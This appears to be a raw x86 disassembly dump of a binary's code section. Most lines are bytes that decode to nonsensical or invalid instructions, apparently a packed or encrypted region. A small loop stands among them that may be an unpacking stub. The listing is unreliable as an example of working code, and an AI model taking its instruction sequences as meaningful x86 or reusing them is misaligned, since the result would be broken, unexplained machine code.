  415f5a:	aad    0xfd
  415f5c:	ja     0x415fd6
  415f5e:	mov    dh,0xb8
  415f60:	inc    ebx
  415f61:	jno    0x415f2c
  415f63:	add    dl,BYTE PTR [ecx+edx*1+0x71]
  415f67:	mov    bl,0x98
  415f69:	repz pop ecx
  415f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f6c:	into   
  415f6d:	daa    
  415f6e:	mov    bl,0x53
  415f70:	cs hlt 
  415f72:	xor    al,0xf6
  415f74:	ds dec esi
  415f76:	cli    
  415f77:	push   cs
  415f78:	dec    esi
  415f79:	push   esp
  415f7a:	and    ebp,eax
  415f7c:	shl    DWORD PTR [edx+0x55],cl
  415f7f:	hlt    
  415f80:	sub    DWORD PTR [esp+ebx*2-0xa7a97ed],eax
  415f87:	mov    dh,0xce
  415f89:	xchg   DWORD PTR [edi+ebp*1],eax
  415f8c:	ret    0x4737
  415f8f:	mov    ch,0xec
  415f91:	loop   0x415f36
  415f93:	ja     0x415f75
  415f95:	rcr    eax,0xe5
  415f98:	ja     0x415f54
  415f9a:	push   eax
  415f9b:	adc    al,0xd6
  415f9d:	shl    esp,cl
  415f9f:	out    0xa7,eax
  415fa1:	xchg   esp,eax
  415fa2:	sbb    BYTE PTR [esi],bl
  415fa4:	inc    ebx
  415fa5:	fisubr DWORD PTR [ecx+0x3]
  415fa8:	ds xor al,0xce
  415fab:	or     DWORD PTR [edi-0x5e23f656],eax
  415fb1:	inc    eax
  415fb2:	stos   DWORD PTR es:[edi],eax
  415fb3:	aam    0x4
  415fb5:	call   0x67ea:0x6f2defdd
  415fbc:	enter  0x11be,0x47
  415fc0:	mov    bh,0x6b
  415fc2:	jns    0x415fb9
  415fc4:	push   ss
  415fc5:	mov    edx,0x7d18087c
  415fca:	push   edx
  415fcb:	call   0x5f23663b
  415fd0:	xchg   esp,eax
  415fd1:	(bad)
  415fd5:	jmp    0x41a15231
  415fda:	dec    edi
  415fdb:	retf   
  415fdc:	int    0x6f
  415fde:	fwait
  415fdf:	jnp    0x41601a
  415fe1:	ret    
  415fe2:	and    DWORD PTR ds:0x301181df,edi
  415fe8:	jno    0x415fea
  415fea:	fmul   st(2),st
  415fec:	ret    0xb8ab
  415fef:	shr    DWORD PTR [ecx+0x31],cl
  415ff2:	push   ebx
  415ff3:	loop   0x416066
  415ff5:	test   eax,0xb894fecb
  415ffa:	jmp    0x416068
  415ffc:	lahf   
  415ffd:	pop    ebx
  415ffe:	rol    BYTE PTR [esi+0x26],cl
  416001:	pop    ebx
  416002:	dec    edi
  416003:	fcmove st,st(7)
  416005:	push   0x20
  416007:	push   esi
  416008:	aas    
  416009:	mov    al,0x49
  41600c:	mov    ah,0xdd
  41600e:	xor    BYTE PTR [edx+edi*4+0x54],bh
  416012:	sbb    DWORD PTR [edi+0x61],eax
  416015:	jne    0x416040
  416017:	push   esi
  416018:	pop    ds
  416019:	fdivrp st(0),st
  41601b:	pushf  
  41601c:	scas   eax,DWORD PTR es:[edi]
  41601d:	sbb    al,BYTE PTR [ecx+0x704377ca]
  416023:	and    al,0x9b
  416025:	in     al,0x68
  416027:	push   ebp
  416028:	or     BYTE PTR [esp+ebx*2],ch
  41602b:	xchg   ebx,eax
  41602d:	mov    ch,0x24
  41602f:	jmp    0x415fde
  416031:	aaa    
  416032:	or     ecx,DWORD PTR [ebp+0x3900cd7d]
  416038:	mov    ds:0x2bf4cad,al
  41603d:	sub    dh,bl
  41603f:	push   ecx
  416040:	mov    edx,0xcaeaaea4
  416045:	sti    
  416046:	fidivr WORD PTR [esi+eax*4+0x11444662]
  41604d:	jecxz  0x416090
  41604f:	jno    0x4160aa
  416051:	inc    eax
  416052:	push   ebp
  416053:	inc    ebx
  416054:	cmp    DWORD PTR [ecx-0x269a6ac1],edi
  41605a:	pop    ebp
  41605b:	xor    BYTE PTR [eax+0x4c],bl
  41605e:	(bad)  
  41605f:	mov    edi,0x9758bed5
  416064:	pop    ss
  416065:	jl     0x41602f
  416067:	les    ecx,FWORD PTR [ebp-0x32]
  41606a:	mov    eax,0xb963a26a
  41606f:	and    eax,0x49306e2c
  416074:	mov    bl,0xba
  416076:	sub    esp,DWORD PTR [esi+0x519ebd32]
  41607c:	jne    0x4160ee
  41607e:	sbb    al,BYTE PTR [edx-0x64]
  416081:	xchg   esp,eax
  416082:	mov    dl,0x0
  416084:	aad    0x94
  416086:	push   eax
  416087:	sahf   
  416088:	xor    eax,0xdbf5eac0
  41608d:	pmaddwd mm3,QWORD PTR [eax]
  416090:	int    0xb5
  416092:	mov    cl,0x11
  416094:	out    0xba,eax
  416096:	pop    edx
  416097:	adc    ch,BYTE PTR [ebp+0x171e4505]
  41609d:	enter  0x59e6,0x7a
  4160a1:	ficom  WORD PTR [eax+0x1156b56f]
  4160a7:	lock sbb eax,edi
  4160aa:	aam    0xa5
  4160ac:	sbb    BYTE PTR [ecx-0x27771832],dh
  4160b2:	inc    esi
  4160b3:	or     eax,0x84cecee9
  4160b8:	xchg   edi,eax
  4160b9:	adc    eax,0x99561d4
  4160bf:	xor    DWORD PTR ds:0xf3e38a13,esi
  4160c5:	mov    es,ecx
  4160c7:	cld    
  4160c8:	ja     0x4160d0
  4160ca:	dec    edi
  4160cb:	sub    edx,edx
  4160cd:	mov    ch,0xf3
  4160cf:	xchg   bl,ah
  4160d1:	inc    eax
  4160d2:	push   0xffffff89
  4160d4:	movzx  ebp,WORD PTR [edi]
  4160d7:	aam    0x99
  4160d9:	fsub   DWORD PTR ds:0xf61d6c17
  4160df:	iret   
  4160e0:	(bad)  
  4160e2:	xor    al,0xf6
  4160e4:	js     0x4160f9
  4160e6:	loopne 0x416125
  4160e8:	cmc    
  4160e9:	dec    edi
  4160ea:	dec    ebx
  4160eb:	bound  esp,QWORD PTR [ecx+eax*2-0x5182b0c6]
  4160f2:	popa   
  4160f3:	adc    edi,DWORD PTR [ebx-0x6d]
  4160f6:	retf   
  4160f7:	sub    ah,BYTE PTR [ebx+0x287ad82c]
  4160fd:	retf   0x3d08
  416100:	xor    DWORD PTR [ecx],0x781939c1
  416106:	or     eax,0xad30abc3
  41610b:	mov    ebx,0xca003f20
  416110:	sbb    dh,BYTE PTR [ebx+edx*2-0x2bea5e08]
  416117:	xor    eax,0xd2a73488
  41611c:	in     eax,0x8
  41611e:	test   al,0xb9
  416120:	pop    ss
  416121:	or     eax,0xf82c456d
  416126:	jg     0x41611e
  416128:	inc    ebp
  416129:	sahf   
  41612a:	in     al,0x8a
  41612c:	add    DWORD PTR [ebx+0x6223a2d6],edi
  416132:	cmp    esp,ebx
  416134:	ds leave 
  416136:	jbe    0x416157
  416138:	sub    BYTE PTR [ebp+0x620087a7],0xb0
  41613f:	mov    DWORD PTR [edi],ebp
  416141:	ret    
  416142:	aad    0xb2
  416144:	mov    DWORD PTR [ecx-0x7c],eax
  416147:	cs mov ecx,0x41aec95b
  41614d:	mov    edx,DWORD PTR [edx]
  41614f:	pop    ebp
  416150:	pop    edi
  416151:	lea    ebp,[edx+eax*8]
  416154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416155:	jle    0x416175
  416157:	mov    ch,BYTE PTR [ebx]
  416159:	repnz bound ebp,QWORD PTR [edi+0x1b]
  41615d:	lahf   
  41615e:	xlat   BYTE PTR ds:[ebx]
  41615f:	mov    BYTE PTR [ecx-0x4a],ah
  416162:	sub    al,0x92
  416164:	and    BYTE PTR es:[eax+edx*8],cl
  416168:	aas    
  416169:	mov    dl,0x5b
  41616b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41616c:	pop    ds
  41616d:	xor    edi,eax
  41616f:	mov    ch,0xbb
  416171:	sbb    al,0x7f
  416173:	cmp    esp,DWORD PTR [ebp+0x14e025bc]
  416179:	call   0x2cbd431d
  41617e:	add    ecx,DWORD PTR [eax-0x29]
  416181:	sub    DWORD PTR [esi],0xffffffe2
  416184:	popf   
  416185:	(bad)  
  416186:	fcmovne st,st(1)
  416188:	cmp    eax,0x3050d628
  41618d:	call   0xde19:0x20bee4cb
  416194:	adc    al,0xbe
  416196:	and    ebx,edx
  416198:	fild   DWORD PTR [ecx-0x34a53b9a]
  41619e:	icebp  
  41619f:	dec    edx
  4161a0:	adc    cl,BYTE PTR [esi]
  4161a2:	inc    ebp
  4161a3:	mov    WORD PTR [edi+0x619780c9],?
  4161a9:	adc    DWORD PTR ds:0xa9a3640c,esi
  4161af:	add    bl,BYTE PTR [edx+0x77]
  4161b2:	pop    edx
  4161b3:	outs   dx,BYTE PTR ds:[esi]
  4161b4:	std    
  4161b5:	mov    ch,0x8a
  4161b7:	idiv   DWORD PTR [edx-0x1f]
  4161ba:	int3   
  4161bb:	hlt    
  4161bc:	inc    edx
  4161bd:	mov    esi,DWORD PTR [edx+esi*4+0x79]
  4161c1:	mov    bh,0x3
  4161c3:	xor    al,0x62
  4161c5:	pop    edi
  4161c6:	jmp    0x42c4:0x3800f161
  4161cd:	sub    edx,eax
  4161cf:	mov    ecx,0x4a124a93
  4161d4:	(bad)  
  4161d5:	jmp    0x416170
  4161d7:	popf   
  4161d8:	pop    ss
  4161d9:	test   bl,ch
  4161db:	lahf   
  4161dc:	push   0x2f
  4161de:	jle    0x4161f4
  4161e0:	(bad)  
  4161e1:	jp     0x4161a1
  4161e3:	cmp    DWORD PTR [eax-0x3c],ebp
  4161e6:	xor    eax,0x4d443969
  4161eb:	mov    esp,0xccdc4078
  4161f0:	xlat   BYTE PTR ds:[ebx]
  4161f1:	mov    eax,DWORD PTR [ebp-0x4]
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x124ed946]
  416290:	jecxz  0x41624e
  416292:	sbb    BYTE PTR [edi+0x78],bh
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x4162bd
  41629a:	mov    WORD PTR [edx],fs
  41629c:	stos   BYTE PTR es:[edi],al
  41629d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41629e:	xchg   BYTE PTR gs:[edi+0x3c],al
  4162a2:	ffreep st(0)
  4162a4:	fstp   DWORD PTR [edi]
  4162a6:	daa    
  4162a7:	pop    ebp
  4162a8:	pop    ecx
  4162a9:	mov    WORD PTR [ebp-0x2d6e70a5],?
  4162af:	jg     0x416248
  4162b1:	xchg   ecx,eax
  4162b2:	cmp    bh,BYTE PTR [edi]
  4162b4:	nop
  4162b5:	(bad)  
  4162b6:	sub    eax,0x18357ca4
  4162bb:	adc    DWORD PTR [esi+0x345f5c21],ebp
  4162c1:	mov    ch,0xa9
  4162c3:	inc    esp
  4162c4:	shl    bl,1
  4162c6:	std    
  4162c7:	cdq    
  4162c8:	mov    WORD PTR [edx-0x18d63f99],gs
  4162ce:	mov    ecx,0xbbb12c46
  4162d3:	(bad)  
  4162d4:	push   ebx
  4162d5:	mov    bh,bh
  4162d7:	pop    ecx
  4162d8:	ja     0x416316
  4162da:	add    ebp,edi
  4162dc:	mov    bl,0xa3
  4162de:	call   0xf2dc406c
  4162e3:	push   edx
  4162e4:	pop    esp
  4162e5:	mov    bh,0x1d
  4162e7:	sahf   
  4162e8:	es pop edi
  4162ea:	(bad)  
  4162ec:	push   edi
  4162ed:	push   esp
  4162ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162ef:	inc    eax
  4162f0:	jae    0x416322
  4162f2:	pop    eax
  4162f3:	mov    eax,ds:0x4eede593
  4162f8:	retf   0xe6c2
  4162fb:	xchg   edi,eax
  4162fc:	int3   
  4162fd:	popa   
  4162fe:	loope  0x41628a
  416300:	into   
  416301:	sar    DWORD PTR [edx],1
  416303:	pop    edx
  416304:	mov    cl,0xde
  416306:	stos   BYTE PTR es:[edi],al
  416307:	mov    al,ds:0xe633074
  41630c:	scas   eax,DWORD PTR es:[edi]
  41630d:	test   BYTE PTR [edx],ah
  41630f:	xchg   ebp,eax
  416310:	and    BYTE PTR ss:[eax+0x4830d851],dh
  416317:	pop    ss
  416318:	std    
  416319:	shl    DWORD PTR [edx-0x3badf42a],0x52
  416320:	retf   
  416321:	aas    
  416322:	add    dh,al
  416324:	push   ds
  416325:	mov    esp,0x8698cd17
  41632a:	jmp    0xc9af:0x4b2a7a92
  416331:	inc    ebp
  416332:	mov    ecx,0xa320b0d3
  416337:	adc    ah,BYTE PTR [esi]
  416339:	mov    al,ds:0x42a672a5
  41633e:	dec    edx
  41633f:	xor    eax,esi
  416341:	ret    
  416342:	js     0x4162e7
  416344:	ds fwait
  416346:	repz mov ds:0x3348d4da,al
  41634c:	and    eax,0x32a097b7
  416351:	retf   
  416352:	sbb    BYTE PTR [ebx+eax*1],0xb8
  416356:	sbb    ax,cx
  416359:	iret   
  41635a:	mov    gs,WORD PTR [edi+0x52]
  41635d:	sbb    eax,0x2f79ec78
  416362:	in     eax,dx
  416363:	mov    ah,0xe0
  416365:	mov    esp,esp
  416367:	mov    ds:0x296fa9de,al
  41636c:	out    0x97,al
  41636e:	dec    esi
  41636f:	add    eax,0x3989ab1a
  416374:	lea    ebx,[edi-0x72]
  416377:	fsub   QWORD PTR [eax]
  416379:	and    al,BYTE PTR [eax+0x2eb492ac]
  41637f:	mov    edx,0x9cd2125e
  416384:	adc    ebx,DWORD PTR [ecx+0x58e8360f]
  41638a:	cmp    bh,BYTE PTR [eax+eiz*2]
  41638d:	jne    0x4163fe
  41638f:	shl    bl,cl
  416391:	or     edi,eax
  416393:	stos   BYTE PTR es:[edi],al
  416394:	push   esi
  416395:	push   ebx
  416396:	dec    esi
  416397:	xchg   eax,ecx
  416399:	cmp    edi,0x28
  41639c:	xor    esp,eax
  41639e:	shr    BYTE PTR [eax*1+0x7936ab3e],0xcb
  4163a6:	fidiv  DWORD PTR [ecx+0x4]
  4163a9:	fsub   DWORD PTR [esi]
  4163ab:	jecxz  0x416402
  4163ad:	push   esp
  4163ae:	fcom   QWORD PTR [esi]
  4163b0:	pop    esp
  4163b1:	lods   al,BYTE PTR ds:[esi]
  4163b2:	jo     0x4163f6
  4163b4:	dec    eax
  4163b5:	adc    DWORD PTR [esi+0x71],eax
  4163b8:	shl    esi,cl
  4163ba:	enter  0x20d,0x16
  4163be:	mov    fs,WORD PTR [eax]
  4163c0:	add    eax,DWORD PTR [edi+0x73]
  4163c3:	imul   eax,DWORD PTR [ebx+ecx*1-0x7],0xffffffc1
  4163c8:	stos   BYTE PTR es:[edi],al
  4163c9:	fst    DWORD PTR [edx+0x757f3dae]
  4163cf:	mov    WORD PTR [edx],ss
  4163d1:	mov    eax,0x1ba89507
  4163d6:	sub    al,0x93
  4163d8:	mov    BYTE PTR [edx+0x2b],cl
  4163db:	pushf  
  4163dc:	inc    ecx
  4163dd:	test   eax,0x38dac516
  4163e2:	sbb    eax,0x39162f76
  4163e7:	arpl   WORD PTR [edi+eiz*1],dx
  4163ea:	sbb    DWORD PTR [ecx-0x4f2fe2a8],edi
  4163f0:	or     BYTE PTR [edi-0x44],0xef
  4163f4:	and    ebp,DWORD PTR [edi+edi*4]
  4163f7:	sti    
  4163f8:	push   cs
  4163f9:	(bad)  
  4163fb:	call   0x128a7c8a
  416400:	push   cs
  416401:	push   ds
  416402:	pop    ecx
  416403:	stc    
  416404:	daa    
  416405:	shl    esi,1
  416407:	call   DWORD PTR [eax+ecx*2+0x36102284]
  41640e:	aad    0x54
  416410:	pop    ebp
  416411:	popf   
  416412:	sub    edi,DWORD PTR [edx]
  416414:	cmp    dl,BYTE PTR ss:0x32debdb4
  41641b:	adc    al,bl
  41641d:	sub    DWORD PTR [ebx-0x2f],esp
  416420:	fld    TBYTE PTR [edi-0x59]
  416423:	inc    ebp
  416424:	add    ebx,DWORD PTR gs:[eax-0x57]
  416428:	pop    edi
  416429:	push   ebx
  41642a:	cmp    edi,esp
  41642c:	pop    ds
  41642d:	inc    eax
  41642e:	jmp    0x41642e
  416430:	mov    al,ds:0x19b964b7
  416435:	rcr    al,1
  416437:	sahf   
  416438:	or     BYTE PTR [ecx+0xc],cl
  41643b:	fistp  QWORD PTR [edi-0x24]
  41643e:	xchg   edi,eax
  41643f:	aam    0xf
  416441:	jmp    0xf7a6eda4
  416446:	adc    bh,BYTE PTR [esi+eiz*1+0x4e7ed394]
  41644d:	mov    ecx,0x16fe95e3
  416452:	mov    ebp,0xda24edd3
  416457:	mov    DWORD PTR [edx+0x1d9eb1c0],esi
  41645d:	sbb    ebp,eax
  41645f:	jge    0x4164b8
  416461:	fld    QWORD PTR [edx-0x38b6fa36]
  416467:	mov    al,ds:0xbf7f5927
  41646c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41646d:	out    dx,eax
  41646e:	pop    ecx
  41646f:	and    ah,dl
  416471:	sti    
  416472:	xchg   esp,eax
  416473:	push   ds
  416474:	sbb    al,0x6d
  416476:	mov    ds:0xe4f65969,al
  41647b:	xchg   edi,eax
  41647c:	mov    esp,0xedaf804e
  416481:	pop    ecx
  416482:	xchg   edi,eax
  416483:	test   DWORD PTR [edx],esi
  416485:	retf   0x7571
  416488:	push   ss
  416489:	inc    ecx
  41648a:	loop   0x4164ec
  41648c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41648d:	iret   
  41648e:	fimul  DWORD PTR [edi+eiz*2]
  416491:	jnp    0x416497
  416493:	mov    bl,0xc1
  416495:	inc    ebp
  416496:	inc    edx
  416497:	jne    0x416482
  416499:	pop    ss
  41649a:	mov    ebp,0x15e0a0ab
  41649f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a0:	in     al,0x26
  4164a2:	out    0x11,eax
  4164a4:	push   ecx
  4164a5:	sub    eax,0x7117ea1a
  4164aa:	dec    ebx
  4164ab:	fcmovnu st,st(2)
  4164ad:	dec    ebp
  4164ae:	out    0xf3,eax
  4164b0:	adc    edx,DWORD PTR [edi-0x617f4598]
  4164b6:	(bad)  
  4164b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b8:	xor    ecx,eax
  4164ba:	xor    al,0x64
  4164bc:	jo     0x416513
  4164be:	mov    DWORD PTR [esi+ebx*1],esi
  4164c1:	in     eax,0xa8
  4164c3:	inc    esi
  4164c4:	ret    
  4164c5:	outs   dx,BYTE PTR ds:[esi]
  4164c6:	stc    
  4164c7:	push   ss
  4164c8:	das    
  4164c9:	xlat   BYTE PTR ds:[ebx]
  4164ca:	inc    esi
  4164cb:	mov    dh,0x9d
  4164cd:	bound  edi,QWORD PTR [edi]
  4164cf:	mov    ch,0x88
  4164d1:	out    dx,eax
  4164d2:	ins    DWORD PTR es:[edi],dx
  4164d3:	(bad)  
  4164d5:	ds pop ecx
  4164d7:	inc    ebx
  4164d8:	mov    ds:0x4abb7a97,eax
  4164dd:	les    esp,FWORD PTR [ebx+0x2b]
  4164e0:	pop    esp
  4164e1:	add    BYTE PTR [edx-0x4f88ae91],0xa
  4164e8:	sti    
  4164e9:	loop   0x416549
  4164eb:	xchg   edi,eax
  4164ec:	dec    esp
  4164ed:	mov    esi,0xfcf03631
  4164f2:	int3   
  4164f3:	jl     0x416478
  4164f5:	and    eax,0x2673b229
  4164fa:	sbb    DWORD PTR [esp+eax*4+0x5264592e],edi
  416501:	(bad)  
  416502:	psadbw mm1,QWORD PTR [eax+edi*4-0x21ce9c94]
  41650a:	mov    bh,0xde
  41650c:	nop
  41650d:	xchg   edi,eax
  41650e:	fwait
  41650f:	jecxz  0x416502
  416511:	dec    esi
  416512:	inc    edx
  416513:	inc    ebx
  416514:	in     eax,dx
  416515:	pop    eax
  416516:	mov    eax,ds:0x128a70e4
  41651b:	jp     0x416515
  41651d:	mov    BYTE PTR [ebp+0x51],ch
  416520:	ficom  DWORD PTR [edx-0x74]
  416523:	cmc    
  416524:	and    bh,dh
  416526:	ja     0x416576
  416528:	lahf   
  416529:	dec    ebp
  41652a:	sub    bl,BYTE PTR [edi+ebx*2]
  41652d:	fdivrp st(4),st
  41652f:	push   edx
  416530:	stos   BYTE PTR es:[edi],al
  416531:	xor    al,0xe8
  416533:	ins    BYTE PTR es:[edi],dx
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x341c839a],cl
  416557:	push   esi
  416558:	add    BYTE PTR [eax+0x787f1dd9],bl
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x4165b3
  416563:	pop    ebp
  416564:	idiv   DWORD PTR [ebx-0x14]
  416567:	jmp    0x497077f2
  41656c:	stc    
  41656d:	arpl   WORD PTR [edx-0x2a],dx
  416570:	xlat   BYTE PTR ds:[ebx]
  416571:	and    eax,0xece67a1e
  416576:	stc    
  416577:	dec    esi
  416578:	out    0x3e,al
  41657a:	mov    WORD PTR cs:[ecx],es
  41657d:	dec    ecx
  41657e:	int3   
  41657f:	inc    ecx
  416580:	popa   
  416581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416582:	js     0x41651e
  416584:	iret   
  416585:	test   eax,0x3ba7e4e0
  41658a:	or     ch,BYTE PTR [ecx+0x48]
  41658d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41658e:	cmp    DWORD PTR [esi+0x31],eax
  416591:	cdq    
  416592:	push   cs
  416593:	cmp    DWORD PTR [ecx+ebp*8],edx
  416596:	adc    bl,cl
  416598:	mov    ebx,0xeab733a7
  41659d:	xor    BYTE PTR [ebp-0xb5de759],bl
  4165a3:	in     eax,0xce
  4165a5:	pop    ebp
  4165a6:	je     0x416607
  4165a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a9:	jns    0x41653a
  4165ab:	mov    eax,ecx
  4165ad:	scas   al,BYTE PTR es:[edi]
  4165ae:	jp     0x41660b
  4165b0:	test   al,0xd4
  4165b2:	jmp    0x54fa1b51
  4165b7:	gs ret 
  4165b9:	adc    DWORD PTR [esi],edi
  4165bb:	daa    
  4165bc:	rcl    dh,1
  4165be:	xor    eax,0xe4b9f712
  4165c3:	sub    BYTE PTR [eax],0xb7
  4165c6:	js     0x416553
  4165c8:	(bad)
  4165cb:	lods   al,BYTE PTR ds:[esi]
  4165cc:	pop    es
  4165cd:	arpl   WORD PTR [ebp+0x3d944693],sp
  4165d3:	rcl    BYTE PTR [eax],cl
  4165d5:	shl    edx,0x9c
  4165d8:	dec    eax
  4165d9:	jecxz  0x41658c
  4165db:	push   cs
  4165dc:	pop    ebx
  4165dd:	les    edx,FWORD PTR [eax-0x32]
  4165e0:	imul   edx,DWORD PTR [ebx+0xbebe790],0x4e5a131
  4165ea:	cmp    edx,DWORD PTR gs:[edx+0x61]
  4165ee:	outs   dx,BYTE PTR ds:[esi]
  4165ef:	mov    ah,0xdc
  4165f1:	in     eax,0xd7
  4165f3:	jbe    0x4165e3
  4165f5:	out    0x2c,eax
  4165f7:	sbb    al,0xe8
  4165f9:	out    dx,eax
  4165fa:	out    0x7c,eax
  4165fc:	inc    ecx
  4165fd:	xchg   edi,eax
  4165fe:	cdq    
  4165ff:	jmp    0x4165d6
  416601:	lods   eax,DWORD PTR ds:[esi]
  416602:	inc    ebx
  416603:	into   
  416604:	xlat   BYTE PTR ds:[ebx]
  416605:	aad    0xc6
  416607:	xor    ebp,DWORD PTR [edx-0x261fb05a]
  41660d:	(bad)  
  41660e:	int3   
  41660f:	test   eax,ecx
  416611:	rcl    DWORD PTR [ebx+edi*8],cl
  416614:	sbb    DWORD PTR [ebx-0x30da3d36],esi
  41661a:	pop    ebx
  41661b:	xchg   DWORD PTR ds:0x32212de2,ebp
  416621:	pop    ecx
  416622:	out    dx,al
  416623:	adc    ecx,DWORD PTR ds:0x93fa7980
  416629:	mov    ch,0x40
  41662b:	add    bh,BYTE PTR [edi]
  41662d:	sti    
  41662e:	sub    BYTE PTR [ebp-0x20],bh
  416631:	into   
  416632:	int    0x39
  416634:	pop    eax
  416635:	or     esi,DWORD PTR [esi+0x1f7c902]
  41663b:	sahf   
  41663c:	loope  0x4165d9
  41663e:	cli    
  41663f:	loop   0x416615
  416641:	push   es
  416642:	lds    ebp,FWORD PTR [ecx+0x5e]
  416645:	inc    esp
  416646:	pusha  
  416647:	jo     0x416665
  416649:	pop    ecx
  41664a:	sbb    edx,esi
  41664c:	cwde   
  41664d:	xor    al,0x3e
  41664f:	push   ds
  416650:	icebp  
  416651:	xchg   esp,eax
  416652:	test   bh,ah
  416654:	inc    edx
  416655:	xor    al,0xda
  416657:	mov    ch,0xfe
  416659:	test   eax,0xe2eb3b8e
  41665e:	jp     0x41667d
  416660:	cmp    BYTE PTR [edi+esi*1],0xeb
  416664:	or     ebp,DWORD PTR [eax]
  416666:	cmp    al,0x9f
  416668:	std    
  416669:	int    0xf6
  41666b:	retf   0x77fe
  41666e:	push   0xffffffc9
  416670:	ret    0xa4d9
  416673:	imul   esi,DWORD PTR [ecx],0x36239352
  416679:	popa   
  41667a:	pop    ebx
  41667b:	pop    esp
  41667c:	call   0x5c5f:0x937f75f
  416683:	xchg   BYTE PTR [edi],dh
  416685:	inc    eax
  416686:	out    0x2e,al
  416688:	sbb    eax,0x684a68a6
  41668d:	stos   BYTE PTR es:[edi],al
  41668e:	icebp  
  41668f:	out    dx,al
  416690:	add    eax,0xb2a10b17
  416695:	out    dx,al
  416696:	pop    edi
  416697:	sub    bh,BYTE PTR [ecx+0x23]
  41669a:	rcr    DWORD PTR [esi-0x13b42e29],0xfb
  4166a1:	jo     0x416672
  4166a3:	call   0x6ec1:0x741b25d2
  4166aa:	std    
  4166ab:	jecxz  0x416642
  4166ad:	daa    
  4166ae:	(bad)  
  4166af:	mov    esi,0x24fd0256
  4166b4:	add    al,0x38
  4166b6:	adc    eax,0xb750dedb
  4166bb:	push   esi
  4166bc:	ins    DWORD PTR es:[edi],dx
  4166bd:	pop    ecx
  4166be:	aaa    
  4166bf:	mov    cl,0x95
  4166c1:	sub    cl,ah
  4166c3:	sbb    ah,BYTE PTR [ecx]
  4166c5:	inc    edi
  4166c6:	iret   
  4166c7:	sub    bl,BYTE PTR [ebx-0x4d]
  4166ca:	dec    ebx
  4166cb:	push   edi
  4166cc:	mov    dh,0x2a
  4166ce:	cmp    ebp,DWORD PTR [edi-0x22]
  4166d1:	push   cs
  4166d2:	fwait
  4166d3:	std    
  4166d4:	cmp    eax,0x1d9fcba6
  4166d9:	inc    eax
  4166da:	ds xchg edi,eax
  4166dc:	int    0x24
  4166de:	sbb    ebp,DWORD PTR [ebp+0x5b54ae49]
  4166e4:	or     dl,BYTE PTR [ebp+0x1]
  4166e7:	fisub  DWORD PTR [ebp+0x4b]
  4166ea:	cmp    cl,BYTE PTR [esp+edx*8+0x5ebc3450]
  4166f1:	in     eax,dx
  4166f2:	mov    al,ds:0x37c1d05e
  4166f7:	(bad)  [ebp-0x39b84b47]
  4166fd:	(bad)  [edi-0x4c]
  416700:	fmulp  st(5),st
  416702:	arpl   WORD PTR [ecx-0x5b],bx
  416705:	ss std 
  416707:	imul   ecx,DWORD PTR [ebp-0x620908b9],0x14
  41670e:	ins    DWORD PTR es:[edi],dx
  41670f:	(bad)  [eax]
  416711:	xor    eax,0xd39c6370
  416716:	mov    ?,WORD PTR [esi-0x56]
  416719:	ins    BYTE PTR es:[edi],dx
  41671a:	xchg   edi,eax
  41671b:	and    eax,0x19e2446
  416720:	shl    DWORD PTR [esi+0x16],cl
  416723:	data16 stc 
  416725:	push   cs
  416726:	cmp    ch,ch
  416728:	mov    ebp,0xd762a41e
  41672d:	and    al,0xad
  41672f:	inc    edx
  416730:	xlat   BYTE PTR ds:[ebx]
  416731:	add    esi,ebp
  416733:	xchg   esi,eax
  416734:	aas    
  416735:	enter  0xb521,0x69
  416739:	fsub   QWORD PTR [eax+0x5cbec7d6]
  41673f:	inc    ecx
  416740:	idiv   BYTE PTR [eax+0x54765419]
  416746:	and    al,0x66
  416748:	test   al,0x57
  41674a:	ret    
  41674b:	mov    al,ds:0x79df0c0b
  416750:	mov    edi,DWORD PTR [esp+edi*8]
  416753:	leave  
  416754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416755:	test   DWORD PTR ds:0x7a55b6,edx
  41675b:	add    eax,0x31e948c4
  416760:	out    0xd,al
  416762:	aas    
